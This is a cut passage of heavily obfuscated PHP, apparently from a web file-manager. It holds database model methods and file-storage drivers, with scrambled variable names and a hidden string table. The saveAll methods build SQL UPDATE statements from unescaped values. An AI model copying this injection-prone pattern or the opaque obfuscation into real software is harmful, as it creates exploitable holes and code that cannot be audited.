$_SERVER[Ùæõ‰Ï’]; if (!$this->tableMeta || !$ã‹ ñû®) { return !1; } $ÏåÈšµ = $this->tableMeta[$÷Å½œéê[447]]; $œò“„Ç˜ = $this->tableMeta[$÷Å½œéê[448]]; $²ÓË«´ = Model($œò“„Ç˜); $øøàÕÀğ = array($ÏåÈšµ => $ã‹ ñû®, $÷Å½œéê[449] => $Öêã”­Ä); if (is_null($Öêã”­Ä)) { return $²ÓË«´->where(array($ÏåÈšµ => $ã‹ ñû®))->delete(); } if (is_null($ÕóÀîÙš) && is_string($Öêã”­Ä)) { return $²ÓË«´->where($øøàÕÀğ)->delete(); } $É›â‡´ = is_array($Öêã”­Ä) ? $Öêã”­Ä : array(); if (is_string($Öêã”­Ä)) { $É›â‡´[$Öêã”­Ä] = $ÕóÀîÙš; } $ùáõÇ’ = array(); foreach ($É›â‡´ as $íÅâÌ² => $ÛÔôˆÙª) { if (is_null($ÛÔôˆÙª) && is_string($íÅâÌ²)) { $²ÓË«´->where(array($ÏåÈšµ => $ã‹ ñû®, $÷Å½œéê[449] => $íÅâÌ²))->delete(); continue; } $this->checkLength($ÛÔôˆÙª, !1, $œò“„Ç˜ . $÷Å½œéê[4] . $íÅâÌ²); $ùáõÇ’[] = array($ÏåÈšµ => $ã‹ ñû®, $÷Å½œéê[97] => $íÅâÌ², $÷Å½œéê[450] => $ÛÔôˆÙª); } $ÆœÎåê¥ = $÷Å½œéê[451] . $œò“„Ç˜; CacheLock::lock($ÆœÎåê¥); $²ÓË«´->where(array($ÏåÈšµ => $ã‹ ñû®))->addAll($ùáõÇ’, array(), !0); CacheLock::unlock($ÆœÎåê¥); return !0; } public function metaGet($ñóÜ¨Ğî, $‡Ù»×à = false) { $×À¥¹Í =& $_SERVER[Ùæõ‰Ï’]; if (!$this->tableMeta) { return array(); } $Ø¦…¹ó÷ = $this->tableMeta[$×À¥¹Í[447]]; $¯³´İêÜ = Model($this->tableMeta[$×À¥¹Í[448]]); if ($‡Ù»×à) { $£˜Â»ß— = array($Ø¦…¹ó÷ => $ñóÜ¨Ğî, $×À¥¹Í[97] => $‡Ù»×à); return $¯³´İêÜ->where($£˜Â»ß—)->getField($×À¥¹Í[450]); } $£˜Â»ß— = array($Ø¦…¹ó÷ => $ñóÜ¨Ğî); $Ú®ĞÃ…Ï = $¯³´İêÜ->field($×À¥¹Í[452])->where($£˜Â»ß—)->select(); $Ú®ĞÃ…Ï = array_to_keyvalue($Ú®ĞÃ…Ï, $×À¥¹Í[97], $×À¥¹Í[450]); return $Ú®ĞÃ…Ï; } private function checkDataAutoHas($ÙË³) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ŠĞôŞõÛ) { if (in_array($ÙË³, explode($_SERVER[Ùæõ‰Ï’][50], $ŠĞôŞõÛ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$»£Ùö¼Ê, $‹á¾Ö’) { $–óĞß¡× =& $_SERVER[Ùæõ‰Ï’]; if (!is_array($»£Ùö¼Ê)) { return; } foreach ($this->dataAuto as $ÎØåüó) { $ç¬ Óşš = $ÎØåüó[0]; if (!in_array($‹á¾Ö’, explode($–óĞß¡×[50], $ÎØåüó[2]))) { continue; } switch (trim($ÎØåüó[3])) { case $–óĞß¡×[397]: case $–óĞß¡×[398]: $ö¦±´Ñ´ = $ÎØåüó[1]; $’š­ù”î = isset($ÎØåüó[4]) ? (array) $ÎØåüó[4] : array(); if ($ö¦±´Ñ´ == $–óĞß¡×[206] && array_key_exists($ç¬ Óşš, $»£Ùö¼Ê)) { if (!$»£Ùö¼Ê[$ç¬ Óşš]) { unset($»£Ùö¼Ê[$ç¬ Óşš]); } break; } if (isset($»£Ùö¼Ê[$ç¬ Óşš])) { array_unshift($’š­ù”î, $»£Ùö¼Ê[$ç¬ Óşš]); } if ($–óĞß¡×[397] == $ÎØåüó[3]) { $»£Ùö¼Ê[$ç¬ Óşš] = call_user_func_array($ö¦±´Ñ´, $’š­ù”î); } else { $»£Ùö¼Ê[$ç¬ Óşš] = call_user_func_array(array(&$this, $ö¦±´Ñ´), $’š­ù”î); } break; case $–óĞß¡×[347]: if (isset($»£Ùö¼Ê[$ç¬ Óşš]) && $»£Ùö¼Ê[$ç¬ Óşš]) { $»£Ùö¼Ê[$ç¬ Óşš] = call_user_func_array(array(&$this, $ÎØåüó[1]), array($»£Ùö¼Ê[$ç¬ Óşš])); } break; case $–óĞß¡×[350]: $»£Ùö¼Ê[$ç¬ Óşš] = $»£Ùö¼Ê[$ÎØåüó[1]]; break; case $–óĞß¡×[370]: if (isset($»£Ùö¼Ê[$ç¬ Óşš]) && !is_string($»£Ùö¼Ê[$ç¬ Óşš])) { $»£Ùö¼Ê[$ç¬ Óşš] = json_encode_force($»£Ùö¼Ê[$ç¬ Óşš]); } break; case $–óĞß¡×[399]: if ($»£Ùö¼Ê[$ç¬ Óşš] === $–óĞß¡×[12]) { unset($»£Ùö¼Ê[$ç¬ Óşš]); } break; case $–óĞß¡×[400]: $»£Ùö¼Ê[$ç¬ Óşš] = $ÎØåüó[1]; default: break; } } if ($‹á¾Ö’ == $–óĞß¡×[431]) { $ÕóÑ’Ø— = strtolower($this->db->getDbType()); if (strpos($ÕóÑ’Ø—, $–óĞß¡×[13]) !== 0) { return; } $­Í‰æŠ´ = $this->field(!0)->fields; $‘¹É°ó“ = $­Í‰æŠ´[$–óĞß¡×[329]]; if (isset($­Í‰æŠ´[$–óĞß¡×[328]])) { unset($‘¹É°ó“[$­Í‰æŠ´[$–óĞß¡×[328]]]); } foreach ($‘¹É°ó“ as $™½¯‹Ø« => $‹á¾Ö’) { if (!isset($»£Ùö¼Ê[$™½¯‹Ø«])) { $»£Ùö¼Ê[$™½¯‹Ø«] = $–óĞß¡×[12]; } } } } private function dataAfterFilter(&$Ú¦âÜ”ô) { $šööİ§— =& $_SERVER[Ùæõ‰Ï’]; foreach ($this->dataAuto as $Ò™ÚÅèü) { $ø¤üêå = $Ò™ÚÅèü[0]; if (!isset($Ú¦âÜ”ô[$ø¤üêå])) { continue; } if (!in_array($šööİ§—[433], explode($šööİ§—[50], $Ò™ÚÅèü[2]))) { continue; } switch (trim($Ò™ÚÅèü[3])) { case $šööİ§—[397]: case $šööİ§—[398]: $¼ò‹„Î¿ = isset($Ò™ÚÅèü[4]) ? (array) $Ò™ÚÅèü[4] : array(); array_unshift($¼ò‹„Î¿, $Ú¦âÜ”ô[$ø¤üêå]); if (isset($Ò™ÚÅèü[4]) && $Ò™ÚÅèü[4] == $šööİ§—[453]) { $¼ò‹„Î¿ = array($Ú¦âÜ”ô[$ø¤üêå]); } if ($šööİ§—[397] == $Ò™ÚÅèü[3]) { $Ú¦âÜ”ô[$ø¤üêå] = call_user_func_array($Ò™ÚÅèü[1], $¼ò‹„Î¿); } else { $Ú¦âÜ”ô[$ø¤üêå] = call_user_func_array(array(&$this, $Ò™ÚÅèü[1]), $¼ò‹„Î¿); } break; case $šööİ§—[347]: if (isset($Ú¦âÜ”ô[$ø¤üêå]) && $Ú¦âÜ”ô[$ø¤üêå]) { $Ú¦âÜ”ô[$ø¤üêå] = call_user_func_array(array(&$this, $Ò™ÚÅèü[1]), array($Ú¦âÜ”ô[$ø¤üêå])); } break; case $šööİ§—[350]: $Ú¦âÜ”ô[$ø¤üêå] = $Ú¦âÜ”ô[$Ò™ÚÅèü[1]]; break; case $šööİ§—[370]: $ƒé ã°˜ = $Ú¦âÜ”ô[$ø¤üêå]; $Ú¦âÜ”ô[$ø¤üêå] = json_decode($ƒé ã°˜, !0); if (is_null($Ú¦âÜ”ô[$ø¤üêå])) { $Ú¦âÜ”ô[$ø¤üêå] = $ƒé ã°˜; } break; case $šööİ§—[399]: if ($Ú¦âÜ”ô[$ø¤üêå] === $šööİ§—[12]) { unset($Ú¦âÜ”ô[$ø¤üêå]); } break; case $šööİ§—[400]: $Ú¦âÜ”ô[$ø¤üêå] = $Ò™ÚÅèü[1]; break; default: break; } } } public function saveAll($™Õ·®À) { $ûŠ–ğ‚ø =& $_SERVER[Ùæõ‰Ï’]; $ŠáÄñ±ñ = $this->tablePrefix . $this->tableName; $ı±§ŒØ´ = self::SQL_WHERE_IN_CHUNK; $™Õ·®À = is_array($™Õ·®À) ? $™Õ·®À : array(); $Â±Œ÷™´ = $ûŠ–ğ‚ø[454]; $óãëÏË÷ = 0; $Üøş¦“ = array(); $‡ú…Õ°¤ = count($™Õ·®À); for ($º©Çè « = 0; $º©Çè « < $‡ú…Õ°¤; $º©Çè «++) { $îîıµãç = $™Õ·®À[$º©Çè «]; if (!is_array($îîıµãç) || count($îîıµãç) != 4) { continue; } $å…óÚ¿› = "\x55\x50\104\101\124\x45\x20\x60{$ŠáÄñ±ñ}\x60\x20\x53\105\x54\40{$îîıµãç[2]}\x20\75\40\103\101\x53\105\x20{$îîıµãç[0]}\40\12"; if ($óãëÏË÷ == 0) { $Â±Œ÷™´ = $å…óÚ¿›; } $Üøş¦“[] = $ûŠ–ğ‚ø[121] . $îîıµãç[1] . $ûŠ–ğ‚ø[121]; $óãëÏË÷++; $Â±Œ÷™´ .= "\40\x57\110\x45\116\40\47{$îîıµãç[1]}\47\40\124\x48\105\x4e\40\x27{$îîıµãç[3]}\47\40\12"; if ($óãëÏË÷ == $ı±§ŒØ´ || $º©Çè « == $‡ú…Õ°¤ - 1) { $“àËˆÂÔ = implode($ûŠ–ğ‚ø[50], $Üøş¦“); $Â±Œ÷™´ .= "\40\x45\116\104\x20\x20\x57\110\105\122\105\x20{$îîıµãç[0]}\40\x49\116\40\x28{$“àËˆÂÔ}\51\x20"; $this->execute($Â±Œ÷™´); $óãëÏË÷ = 0; $Â±Œ÷™´ = $å…óÚ¿›; $this->chunkEventCheck(count($Üøş¦“)); $Üøş¦“ = array(); } } $this->chunkEventSet(); } public function saveAllEach($¹Ñûàøø) { $í¬û”µÑ =& $_SERVER[Ùæõ‰Ï’]; $’ùŒşú¥ = $this->tablePrefix . $this->tableName; foreach ($¹Ñûàøø as $ÍÅËáœ) { if (!is_array($ÍÅËáœ) || count($ÍÅËáœ) != 4) { continue; } $ÀÑšÚ½É = $ÍÅËáœ[0] . $í¬û”µÑ[455] . $ÍÅËáœ[1] . $í¬û”µÑ[121]; $‚Š…È’Ç = $ÍÅËáœ[2] . $í¬û”µÑ[455] . $ÍÅËáœ[3] . $í¬û”µÑ[121]; $äŞ…Áø² = "\165\160\x64\x61\x74\x65\x20{$’ùŒşú¥}\40\x73\145\x74\40{$‚Š…È’Ç}\x20\x77\x68\145\x72\x65\x20{$ÀÑšÚ½É}\73"; $this->execute($äŞ…Áø²); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‰¡ËÄŠ = false, $¿ÆÄüØ© = false) { $this->_chunkEvent = $‰¡ËÄŠ; $this->_chunkEventParam = $¿ÆÄüØ©; } private function chunkEventCheck($êåïÛ…ã) { if (!$this->_chunkEvent) { return; } $õ·¯ßŠø = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $õ·¯ßŠø[$_SERVER[Ùæõ‰Ï’][456]] = $êåïÛ…ã; Hook::trigger($this->_chunkEvent, $õ·¯ßŠø); } public function addAll($ù±‹÷Â¯, $›äùªİÓ = array(), $‹òĞ—³à = false) { $ˆÂ¢Öù =& $_SERVER[Ùæõ‰Ï’]; ignore_timeout(); $ÄœòØĞ• = self::SQL_WHERE_IN_CHUNK; if (empty($ù±‹÷Â¯)) { $this->error = think_lang($ˆÂ¢Öù[348]); return !1; } $›äùªİÓ = $this->_parseOptions($›äùªİÓ); foreach ($ù±‹÷Â¯ as $•åâ›¡ä => $ş‡‘‹Ã) { $ù±‹÷Â¯[$•åâ›¡ä] = $this->_facade($ş‡‘‹Ã); $this->_beforeInsert($ù±‹÷Â¯[$•åâ›¡ä], $›äùªİÓ); } if (method_exists($this->db, $ˆÂ¢Öù[349])) { for ($èÕş±»ş = 0; $èÕş±»ş < count($ù±‹÷Â¯); $èÕş±»ş += $ÄœòØĞ•) { $ÇäÓôû® = array_slice($ù±‹÷Â¯, $èÕş±»ş, $ÄœòØĞ•); if (!is_array($ÇäÓôû®) || count($ÇäÓôû®) == 0) { break; } $ìóŸ†İº = $this->db->insertAll($ÇäÓôû®, $›äùªİÓ, $‹òĞ—³à); $this->chunkEventCheck(count($ÇäÓôû®)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ù±‹÷Â¯ as $•åâ›¡ä => $ş‡‘‹Ã) { $ìóŸ†İº = $this->db->insert($ş‡‘‹Ã, $›äùªİÓ, $‹òĞ—³à); } $this->commit(); } if (!1 !== $ìóŸ†İº) { $î½ÂÃ¡ğ = $this->getLastInsID(); if ($î½ÂÃ¡ğ) { return $î½ÂÃ¡ğ; } } return $ìóŸ†İº; } public function save($İñ¹ó– = '', $¶ƒ›İ‰ß = array()) { $”¦ö×²§ =& $_SERVER[Ùæõ‰Ï’]; $ñÄ†Üû„ = self::SQL_WHERE_IN_CHUNK; $²È‡Í– = $this->optionsValue(); $¬ƒáçÆâ = $this->findWhereField($²È‡Í–); if (!$¬ƒáçÆâ) { return parent::save($İñ¹ó–, $¶ƒ›İ‰ß); } $¶Üü„ØŞ = 0; $ñßã³¡ş = $²È‡Í–[$”¦ö×²§[352]][$¬ƒáçÆâ][1]; $ñßã³¡ş = is_array($ñßã³¡ş) ? $ñßã³¡ş : array(); $éÁ…¶Î€ = count($ñßã³¡ş); for ($ÉÂé®å = 0; $ÉÂé®å < $éÁ…¶Î€; $ÉÂé®å += $ñÄ†Üû„) { $ÑûµóÆÍ = array_slice($ñßã³¡ş, $ÉÂé®å, $ñÄ†Üû„); if (!is_array($ÑûµóÆÍ) || count($ÑûµóÆÍ) == 0) { break; } $²È‡Í–[$”¦ö×²§[352]][$¬ƒáçÆâ][1] = $ÑûµóÆÍ; $this->optionsValue($²È‡Í–); $¶Üü„ØŞ += parent::save($İñ¹ó–, $¶ƒ›İ‰ß); $this->chunkEventCheck(count($ÑûµóÆÍ)); } $this->chunkEventSet(); return $¶Üü„ØŞ; } public function add($ÒË“¼²Ä = '', $š¸æ³¨¹ = array(), $í¤ĞÓÎ = false) { if ($this->addTaskStatus && is_array($ÒË“¼²Ä)) { $this->addTaskData[] = $ÒË“¼²Ä; return; } return parent::add($ÒË“¼²Ä, $š¸æ³¨¹, $í¤ĞÓÎ); } public function parseWhereLike($‰ÁÈòê¡, $Ë’àÇñË = '', $£ç²•¬œ = false, &$‰ğæ©×ˆ = false) { $ğù‰ŸÀÅ =& $_SERVER[Ùæõ‰Ï’]; $ôÀËù = $GLOBALS[$ğù‰ŸÀÅ[6]][$ğù‰ŸÀÅ[457]]; if (!$ôÀËù[$ğù‰ŸÀÅ[458]]) { return $‰ÁÈòê¡; } if (!is_array($‰ÁÈòê¡)) { return $‰ÁÈòê¡; } $¥¸“ôÅ™ = array(); $ÇÌ·•°´ = 0; foreach ($‰ÁÈòê¡ as $ÁÁÇÚ¾Ë => $û€­à) { if (is_array($û€­à) && count($û€­à) == 2 && $û€­à[0] == $ğù‰ŸÀÅ[459] && is_string($û€­à[1]) && substr($û€­à[1], 0, 1) == $ğù‰ŸÀÅ[460] && substr($û€­à[1], strlen($û€­à[1]) - 1, 1) == $ğù‰ŸÀÅ[460]) { $‰ğæ©×ˆ = !0; $’Åï¥Š = is_string($ÁÁÇÚ¾Ë) ? $ÁÁÇÚ¾Ë : $Ë’àÇñË; $¼ø’ÔÒä = substr($û€­à[1], 1, strlen($û€­à[1]) - 2); $¼ø’ÔÒä = $this->db->escapeString($¼ø’ÔÒä); if (!strpos($’Åï¥Š, $ğù‰ŸÀÅ[10])) { $’Åï¥Š = $ğù‰ŸÀÅ[461] . $’Åï¥Š . $ğù‰ŸÀÅ[461]; } $ÌáÒŞÛ£ = $ğù‰ŸÀÅ[220] . $¼ø’ÔÒä . $ğù‰ŸÀÅ[220]; $¼ø’ÔÒä = str_replace(array($ğù‰ŸÀÅ[10], $ğù‰ŸÀÅ[462], $ğù‰ŸÀÅ[11]), $ğù‰ŸÀÅ[463], $¼ø’ÔÒä); if ($ôÀËù[$ğù‰ŸÀÅ[464]]) { $ÌáÒŞÛ£ = $ğù‰ŸÀÅ[465] . $¼ø’ÔÒä . $ğù‰ŸÀÅ[466]; if ($ôÀËù[$ğù‰ŸÀÅ[467]]) { $ÌáÒŞÛ£ = $ğù‰ŸÀÅ[466] . $¼ø’ÔÒä . $ğù‰ŸÀÅ[465]; } } $¥¸“ôÅ™[$ÇÌ·•°´] = $ğù‰ŸÀÅ[468] . $’Åï¥Š . $ğù‰ŸÀÅ[469] . $ÌáÒŞÛ£ . $ğù‰ŸÀÅ[470]; $ÇÌ·•°´++; continue; } if (is_array($û€­à)) { $Ë’àÇñË = is_string($ÁÁÇÚ¾Ë) ? $ÁÁÇÚ¾Ë : $Ë’àÇñË; $û€­à = $this->parseWhereLike($û€­à, $Ë’àÇñË, !0, $‰ğæ©×ˆ); } if (is_numeric($ÁÁÇÚ¾Ë)) { $¥¸“ôÅ™[$ÇÌ·•°´] = $û€­à; $ÇÌ·•°´++; } else { $¥¸“ôÅ™[$ÁÁÇÚ¾Ë] = $û€­à; } } if ($‰ğæ©×ˆ && !$£ç²•¬œ) { } return $¥¸“ôÅ™; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ê¼å Æù = array()) { $·åˆòÑ =& $_SERVER[Ùæõ‰Ï’]; $ÁµÕâÎ = self::SQL_WHERE_IN_CHUNK; $›ìšµ€ = $this->optionsValue(); $º©Ú‚ê„ = $this->findWhereField($›ìšµ€); if (!$º©Ú‚ê„ || isset($›ìšµ€[$·åˆòÑ[368]]) || isset($›ìšµ€[$·åˆòÑ[429]])) { return parent::select($Ê¼å Æù); } $€ß¿àä = $›ìšµ€[$·åˆòÑ[352]][$º©Ú‚ê„][1]; $€ß¿àä = is_array($€ß¿àä) ? $€ß¿àä : array(); $ü¨ÚÑè = null; for ($å——Ï² = 0; $å——Ï² < count($€ß¿àä); $å——Ï² += $ÁµÕâÎ) { $Œ×¦²ãŞ = array_slice($€ß¿àä, $å——Ï², $ÁµÕâÎ); if (!is_array($Œ×¦²ãŞ) || count($Œ×¦²ãŞ) == 0) { break; } $›ìšµ€[$·åˆòÑ[352]][$º©Ú‚ê„][1] = $Œ×¦²ãŞ; $this->optionsValue($›ìšµ€); $·Ëİ…ï„ = parent::select($Ê¼å Æù); if (!$·Ëİ…ï„) { continue; } $ü¨ÚÑè = is_array($ü¨ÚÑè) ? $ü¨ÚÑè : array(); $ü¨ÚÑè = array_merge($ü¨ÚÑè, $·Ëİ…ï„); } return $ü¨ÚÑè; } public function delete($ÜâÍ«àÇ = array()) { $’¶ÜÇ¥ı =& $_SERVER[Ùæõ‰Ï’]; $ï‡›ëµ¨ = self::SQL_WHERE_IN_CHUNK; $úõÉÅç– = $this->optionsValue(); $¬²Í›ş“ = $this->findWhereField($úõÉÅç–); if (!$¬²Í›ş“) { return parent::delete($ÜâÍ«àÇ); } $šˆ“Ë„ = 0; $İ³¾Ê† = $úõÉÅç–[$’¶ÜÇ¥ı[352]][$¬²Í›ş“][1]; $İ³¾Ê† = is_array($İ³¾Ê†) ? $İ³¾Ê† : array(); for ($ëÒ²Úİ’ = 0; $ëÒ²Úİ’ < count($İ³¾Ê†); $ëÒ²Úİ’ += $ï‡›ëµ¨) { $Â²†ûùÓ = array_slice($İ³¾Ê†, $ëÒ²Úİ’, $ï‡›ëµ¨); if (!is_array($Â²†ûùÓ) || count($Â²†ûùÓ) == 0) { break; } $úõÉÅç–[$’¶ÜÇ¥ı[352]][$¬²Í›ş“][1] = $Â²†ûùÓ; $this->optionsValue($úõÉÅç–); $šˆ“Ë„ += parent::delete($ÜâÍ«àÇ); } return $šˆ“Ë„; } private function findWhereField($õ¤Ø¯Ù) { $ÚŞå´ =& $_SERVER[Ùæõ‰Ï’]; $Îû“ù»ˆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($õ¤Ø¯Ù) || !is_array($õ¤Ø¯Ù[$ÚŞå´[352]])) { return !1; } foreach ($õ¤Ø¯Ù[$ÚŞå´[352]] as $ÃşäéÔ¾ => $½·Éá€Ò) { if (is_array($½·Éá€Ò) && isset($½·Éá€Ò[0]) && is_string($½·Éá€Ò[0]) && strtolower($½·Éá€Ò[0]) == $ÚŞå´[7] && is_array($½·Éá€Ò[1]) && count($½·Éá€Ò[1]) > $Îû“ù»ˆ) { ignore_timeout(); return $ÃşäéÔ¾; } } return !1; } public function setMasterDB($ŞĞÆÎ = true) { think_config($_SERVER[Ùæõ‰Ï’][471], $ŞĞÆÎ); } } goto AÒ½Î‰è ¥; D¶Ûâº„â: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¶û»Ûş¤) { parent::__construct($¶û»Ûş¤); $this->setSignVersion($_SERVER[Ùæõ‰Ï’][247]); } public function uploadLink($ÄÆ¸÷ïÕ, $”¤Ê¾Î‹ = 0) { $Á„øÙÉ‘ =& $_SERVER[Ùæõ‰Ï’]; if ($this->isUploadServer()) { return; } $°¢ğ®”ı = $this->getType(); if (!in_array($°¢ğ®”ı, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $âÚÁÇšÕ = (!$”¤Ê¾Î‹ ? 1 : ceil($”¤Ê¾Î‹ / pow(1024, 3))) * 3600 * 4; $åÀ„¦´ø = $this->multiUploadFormData($ÄÆ¸÷ïÕ, $âÚÁÇšÕ); if ($åÀ„¦´ø) { $åÀ„¦´ø[$Á„øÙÉ‘[97]] = $ÄÆ¸÷ïÕ; $åÀ„¦´ø[$Á„øÙÉ‘[98]] = $°¢ğ®”ı; } return $åÀ„¦´ø; } public function fileOutImage($¨—œœ´à, $úÑšºÉ· = 250) { if ($this->size($¨—œœ´à) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¨—œœ´à, $úÑšºÉ·); } $°ì¸¾±á = $this->link($¨—œœ´à); $°ì¸¾±á .= $_SERVER[Ùæõ‰Ï’][1464] . $úÑšºÉ·; $this->fileOutLink($°ì¸¾±á); } public function fileOutLink($©ïãìÖŠ) { $°³ç¸Ü® =& $_SERVER[Ùæõ‰Ï’]; if (substr($©ïãìÖŠ, 0, 7) == $°³ç¸Ü®[313]) { $©ïãìÖŠ = $°³ç¸Ü®[314] . substr($©ïãìÖŠ, 7); } header($°³ç¸Ü®[175] . $©ïãìÖŠ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ùí€¼§) { if (substr($ùí€¼§, 0, 2) == $_SERVER[Ùæõ‰Ï’][1451]) { $ùí€¼§ = BASIC_PATH . substr($ùí€¼§, 2); } return $ùí€¼§; } public function iconvApp($ºŠ ’˜) { $î÷‘íöº =& $_SERVER[Ùæõ‰Ï’]; global $config; return $this->iconvTo($ºŠ ’˜, $config[$î÷‘íöº[1449]], $config[$î÷‘íöº[1448]]); } public function iconvSystem($¶×¬©³½) { $Û¾é©Ü” =& $_SERVER[Ùæõ‰Ï’]; global $config; return $this->iconvTo($¶×¬©³½, $config[$Û¾é©Ü”[1448]], $config[$Û¾é©Ü”[1449]]); } public function getPathOuter($ÍâÃ¼Á) { $ÉúÎ¹Š¡ =& $_SERVER[Ùæõ‰Ï’]; $èŸ¿™Šã = $this->iconvApp($this->pathBase); $ÍâÃ¼Á = $this->iconvApp($ÍâÃ¼Á); if (substr($èŸ¿™Šã, 0, 2) == $ÉúÎ¹Š¡[1451]) { $èŸ¿™Šã = BASIC_PATH . substr($èŸ¿™Šã, 2); } if (substr($ÍâÃ¼Á, 0, 2) == $ÉúÎ¹Š¡[1451]) { $ÍâÃ¼Á = BASIC_PATH . substr($ÍâÃ¼Á, 2); } $èŸ¿™Šã = KodIO::clear($èŸ¿™Šã); $ÍâÃ¼Á = KodIO::clear($ÍâÃ¼Á); $ÍâÃ¼Á = substr($ÍâÃ¼Á, strlen($èŸ¿™Šã)); if (empty($this->pathDriver)) { return $ÍâÃ¼Á; } return $this->pathDriver . $ÉúÎ¹Š¡[8] . ltrim($ÍâÃ¼Á, $ÉúÎ¹Š¡[8]); } public function mkfile($ĞÓÄâ¡ş, $‰´Ëï  = '', $µ«‹²‚» = REPEAT_RENAME) { $ĞÓÄâ¡ş = $this->iconvSystem($ĞÓÄâ¡ş); @touch($ĞÓÄâ¡ş); if ($‰´Ëï ) { file_put_contents($ĞÓÄâ¡ş, $‰´Ëï ); } @chmod($ĞÓÄâ¡ş, $this->pathAuth); if (is_file($ĞÓÄâ¡ş)) { return $this->getPathOuter($ĞÓÄâ¡ş); } $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } public function mkdir($©ûÜ§‰´, $„Ü’Ãı­ = REPEAT_SKIP) { $©ûÜ§‰´ = $this->iconvSystem($©ûÜ§‰´); if (is_dir($©ûÜ§‰´)) { return $this->getPathOuter($©ûÜ§‰´); } if (!$this->mkdir($this->pathFather($©ûÜ§‰´))) { return !1; } @mkdir($©ûÜ§‰´, $this->pathAuth, !0); @chmod($©ûÜ§‰´, $this->pathAuth); if (is_dir($©ûÜ§‰´)) { return $this->getPathOuter($©ûÜ§‰´); } $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } public function copyFile($’ÂÉşÕ†, $¿İÄ½ìÙ) { $this->mkdir($this->pathFather($¿İÄ½ìÙ)); $’ÂÉşÕ† = $this->iconvSystem($’ÂÉşÕ†); $¿İÄ½ìÙ = $this->iconvSystem($¿İÄ½ìÙ); $¾ÑŠ±Áõ = copy_64($’ÂÉşÕ†, $¿İÄ½ìÙ); @chmod($¿İÄ½ìÙ, $this->pathAuth); if ($¾ÑŠ±Áõ) { return $this->getPathOuter($¿İÄ½ìÙ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } public function moveFile($íñæğ¸ñ, $üİºŸÓˆ) { $this->mkdir($this->pathFather($üİºŸÓˆ)); $íñæğ¸ñ = $this->iconvSystem($íñæğ¸ñ); $üİºŸÓˆ = $this->iconvSystem($üİºŸÓˆ); $©Ş‹åï = intval(@rename($íñæğ¸ñ, $üİºŸÓˆ)); if (!$©Ş‹åï) { if ($©Ş‹åï = intval(@copy_64($íñæğ¸ñ, $üİºŸÓˆ))) { @unlink($íñæğ¸ñ); } } @chmod($üİºŸÓˆ, $this->pathAuth); if ($©Ş‹åï) { return $this->getPathOuter($üİºŸÓˆ); } $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } public function movePath($··ÚëÍÈ, $«¸Ã°õ, $ŠÎšì­À = false) { $«À¯ĞŠ =& $_SERVER[Ùæõ‰Ï’]; $··ÚëÍÈ = $this->iconvSystem($··ÚëÍÈ); $«¸Ã°õ = $this->iconvSystem($«¸Ã°õ); $åâæç‹œ = rtrim($«¸Ã°õ, $«À¯ĞŠ[8]) . $«À¯ĞŠ[8] . ($ŠÎšì­À ? $ŠÎšì­À : get_path_this($··ÚëÍÈ)); if (file_exists($åâæç‹œ)) { return !1; } $³Ä¼ä¢ï = intval(@rename($··ÚëÍÈ, $åâæç‹œ)); $³Ä¼ä¢ï = file_exists($åâæç‹œ); if ($³Ä¼ä¢ï) { return $this->getPathOuter($åâæç‹œ); } $this->writeLog(__FUNCTION__ . $«À¯ĞŠ[1461], !0); return !1; } public function delFile($Í¢¥øĞª) { $Í¢¥øĞª = $this->iconvSystem($Í¢¥øĞª); if (!@unlink($Í¢¥øĞª)) { @chmod($Í¢¥øĞª, $this->pathAuth); if (@unlink($Í¢¥øĞª)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Ùæõ‰Ï’][1461], !0); return !1; } return !0; } public function delFolder($àÈ»İ¢¬) { $ô¢¶ öî =& $_SERVER[Ùæõ‰Ï’]; $àÈ»İ¢¬ = $this->iconvSystem($àÈ»İ¢¬); if (!is_dir($àÈ»İ¢¬)) { return !0; } if (!($é´ƒÎØ = opendir($àÈ»İ¢¬))) { return !1; } while (($›Ä«ˆƒº = readdir($é´ƒÎØ)) !== !1) { if ($›Ä«ˆƒº == $ô¢¶ öî[10] || $›Ä«ˆƒº == $ô¢¶ öî[1376]) { continue; } $‘›´µÇË = $àÈ»İ¢¬ . $ô¢¶ öî[8] . $›Ä«ˆƒº; if (is_file($‘›´µÇË) || is_link($‘›´µÇË)) { if (!unlink($‘›´µÇË)) { chmod($‘›´µÇË, $this->pathAuth); if (!unlink($‘›´µÇË)) { return !1; } } } else { if (is_dir($‘›´µÇË)) { chmod($‘›´µÇË, $this->pathAuth); $‘›´µÇË = $this->iconvApp($‘›´µÇË); if (!$this->delFolder($‘›´µÇË)) { return !1; } } } } closedir($é´ƒÎØ); return rmdir($àÈ»İ¢¬); } public function rename($µª¬Í¼‘, $º“»ÂñÜ) { $ºèƒŸ·® =& $_SERVER[Ùæõ‰Ï’]; $ôéİƒ¶â = $this->fileNameAuto($this->pathFather($µª¬Í¼‘), $º“»ÂñÜ); $ôéİƒ¶â = $this->iconvSystem($ôéİƒ¶â); $µª¬Í¼‘ = $this->iconvSystem($µª¬Í¼‘); $›ó”õĞÇ = $this->pathFather($µª¬Í¼‘); $¸Á†•ôö = rtrim($›ó”õĞÇ, $ºèƒŸ·®[8]) . $ºèƒŸ·®[8] . $ôéİƒ¶â; $›Š™Ğù‰ = @rename($µª¬Í¼‘, $¸Á†•ôö); $¸Á†•ôö = 